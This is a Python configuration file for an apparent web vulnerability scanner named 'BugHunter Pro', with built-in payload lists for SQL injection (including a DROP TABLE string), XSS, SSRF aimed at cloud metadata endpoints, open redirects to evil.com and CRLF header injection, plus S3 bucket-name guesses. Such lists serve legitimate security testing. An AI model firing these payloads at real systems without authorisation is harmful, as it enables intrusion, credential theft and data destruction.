"""
BugHunter Pro - Global Configuration
"""

import os
from dataclasses import dataclass, field
from typing import List, Optional


@dataclass
class Config:
    """Central configuration for the entire tool."""

    # --- Target ---
    target_domain: str = ""
    base_url: str = ""

    # --- General ---
    threads: int = 20
    timeout: int = 10
    max_retries: int = 3
    delay_between_requests: float = 0.1  # Rate limiting (seconds)
    user_agent: str = (
        "BugHunterPro/1.0")
    verify_ssl: bool = False

    # --- API Keys ---
    shodan_api_key: str = os.getenv("SHODAN_API_KEY", "")

    # --- Wordlist Paths ---
    wordlist_dir: str = os.path.join(os.path.dirname(__file__), "wordlists")
    subdomain_wordlist: str = ""
    directory_wordlist: str = ""
    api_wordlist: str = ""

    # --- Output ---
    output_dir: str = "bughunter_output"
    verbose: bool = False

    # --- Scan Scope ---
    modules_to_run: List[str] = field(default_factory=lambda: ["all"])
    max_crawl_depth: int = 3
    max_crawl_pages: int = 200

    # --- Scanner Payloads (small built-in sets) ---
    sqli_payloads: List[str] = field(default_factory=lambda: [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
        "\" OR 1=1--", "'; DROP TABLE users--", "1' ORDER BY 1--",
        "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
        "' AND '1'='1", "' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
        "' OR ''='", "admin'--",
    ])

    xss_payloads: List[str] = field(default_factory=lambda: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "{{7*7}}",
        "${7*7}",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
    ])

    ssrf_payloads: List[str] = field(default_factory=lambda: [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:22",
    ])

    open_redirect_payloads: List[str] = field(default_factory=lambda: [
        "//evil.com", "https://evil.com", "/\\evil.com",
        "////evil.com", "https:///evil.com",
        "HtTp://evil.com", "http://evil.com%2f%2f",
        "////evil.com/%2f%2e%2e",
    ])

    crlf_payloads: List[str] = field(default_factory=lambda: [
        "%0d%0aSet-Cookie:crlf=injection",
        "%0aSet-Cookie:crlf=injection",
        "%0dSet-Cookie:crlf=injection",
        "\\r\\nSet-Cookie:crlf=injection",
        "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",
    ])

    def __post_init__(self):
        self.subdomain_wordlist = os.path.join(self.wordlist_dir, "subdomains.txt")
        self.directory_wordlist = os.path.join(self.wordlist_dir, "directories.txt")
        self.api_wordlist = os.path.join(self.wordlist_dir, "api_endpoints.txt")

        if self.target_domain:
            if not self.target_domain.startswith(("http://", "https://")):
                self.base_url = f"https://{self.target_domain}"
            else:
                self.base_url = self.target_domain

    # --- Cloud bucket name patterns ---
    s3_bucket_patterns: List[str] = field(default_factory=lambda: [
        "{domain}", "{domain}-backup", "{domain}-assets", "{domain}-static",
        "{domain}-media", "{domain}-uploads", "{domain}-data",
        "{domain}-dev", "{domain}-staging", "{domain}-prod",
        "{domain}-logs", "{domain}-private", "{domain}-public",
        "{domain}-internal", "{domain}-cdn", "{domain}-images",
        "{domain}-files", "{domain}-docs", "{domain}-db-backup",
        "{domain}-config",
    ])

    # Industry keyword mappings for target intelligence
    industry_keywords: dict = field(default_factory=lambda: {
        "finance": [
            "bank", "finance", "pay", "money", "invest", "trade",
            "crypto", "wallet", "loan", "credit", "insurance",
        ],
        "healthcare": [
            "health", "medical", "pharma", "hospital", "clinic",
            "patient", "care", "doctor", "drug", "therapy",
        ],
        "ecommerce": [
            "shop", "store", "buy", "cart", "product", "order",
            "checkout", "catalog", "retail", "marketplace",
        ],
        "education": [
            "edu", "learn", "school", "university", "course",
            "student", "teach", "academy", "training",
        ],
        "technology": [
            "tech", "software", "app", "cloud", "data", "api",
            "dev", "code", "platform", "saas", "digital",
        ],
        "media": [
            "news", "media", "blog", "press", "content",
            "publish", "video", "stream", "social",
        ],
        "government": [
            "gov", "government", "public", "federal", "state",
            "municipal", "civic", "citizen",
        ],
    })